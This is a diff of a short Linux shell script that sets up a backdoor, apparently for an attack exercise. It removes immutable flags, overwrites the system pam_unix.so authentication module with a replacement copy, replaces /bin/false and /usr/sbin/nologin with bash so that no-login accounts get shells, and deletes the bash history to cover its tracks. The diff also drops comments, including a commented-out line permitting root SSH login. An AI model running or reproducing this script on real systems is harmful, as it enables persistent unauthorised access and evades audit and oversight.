@@ -1,20 +1,7 @@
-#unchattr files
 ./chattr -i /lib/x86_64-linux-gnu/security/pam_unix.so
 ./chattr -i /bin/false
 ./chattr -i /usr/sbin/nologin
-
-#permit root login <- do not run unless necessary. 
-#echo "PermitRootLogin yes">>/etc/ssh/sshd_config
-
-#change pam file
-mv ./pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
-
-#change bin/false and /usr/sbin/nologin with my own bash
-
+cp ./pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
 cp ./bash /bin/false
-
 cp ./bash /usr/sbin/nologin
-
-#clear bash history
-history -c
-
+rm ~/.bash_history
